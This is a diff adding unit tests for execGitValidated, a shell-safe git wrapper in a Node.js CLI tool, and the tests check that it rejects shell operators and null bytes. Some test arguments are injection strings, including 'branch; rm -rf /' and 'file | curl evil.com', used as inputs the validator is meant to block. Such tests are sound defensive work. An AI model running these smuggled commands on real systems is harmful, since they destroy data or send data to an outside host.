@@ -7,7 +7,8 @@ const assert = require('node:assert');
 const { execSync } = require('node:child_process');
 const fs = require('fs');
 const path = require('path');
-const { runGsdTools, createTempProject, cleanup } = require('./helpers.cjs');
+const { runGsdTools, createTempProject, createTempGitProject, cleanup } = require('./helpers.cjs');
+const { execGitValidated } = require('../get-shit-done/bin/lib/commands.cjs');
 
 describe('history-digest command', () => {
   let tmpDir;
@@ -1704,5 +1705,73 @@ describe('commit-to-subrepo command', () => {
       (result.error || '').toLowerCase().includes('warning'),
       'should report unmatched files'
     );
+  });
+});
+
+// ─────────────────────────────────────────────────────────────────────────────
+// execGitValidated — shell-safe wrapper around execGit
+// ─────────────────────────────────────────────────────────────────────────────
+
+describe('execGitValidated', () => {
+  let tmpDir;
+
+  beforeEach(() => {
+    tmpDir = createTempGitProject();
+  });
+
+  afterEach(() => {
+    cleanup(tmpDir);
+  });
+
+  test('passes clean args through and returns git result', () => {
+    const result = execGitValidated(tmpDir, ['status', '--short']);
+    assert.strictEqual(result.exitCode, 0, 'git status should succeed');
+    assert.strictEqual(typeof result.stdout, 'string');
+  });
+
+  test('throws on arg containing semicolon (shell operator)', () => {
+    assert.throws(
+      () => execGitValidated(tmpDir, ['checkout', '-b', 'branch; rm -rf /']),
+      /shell operator/,
+      'should reject semicolons in branch names'
+    );
+  });
+
+  test('throws on arg containing pipe operator', () => {
+    assert.throws(
+      () => execGitValidated(tmpDir, ['add', 'file | curl evil.com']),
+      /shell operator/,
+      'should reject pipe operators in file paths'
+    );
+  });
+
+  test('throws on arg containing ampersand', () => {
+    assert.throws(
+      () => execGitValidated(tmpDir, ['checkout', '-b', 'branch & bg']),
+      /shell operator/,
+      'should reject ampersands in branch names'
+    );
+  });
+
+  test('throws on arg with null bytes', () => {
+    assert.throws(
+      () => execGitValidated(tmpDir, ['add', 'file\0name']),
+      /null bytes/,
+      'should reject null bytes in file paths'
+    );
+  });
+
+  test('skips validation for flags (args starting with -)', () => {
+    // Flags like --short, -b etc. should pass through without validation
+    // even though they contain characters that might look suspicious
+    const result = execGitValidated(tmpDir, ['log', '--oneline', '-1']);
+    assert.strictEqual(result.exitCode, 0, 'flags should pass through unvalidated');
+  });
+
+  test('skips validation for git subcommand (first arg, index 0)', () => {
+    // The first argument is always the git subcommand (status, log, add, etc.)
+    // It should never be validated since it's not user input
+    const result = execGitValidated(tmpDir, ['status']);
+    assert.strictEqual(result.exitCode, 0, 'git subcommand should pass through unvalidated');
   });
 });
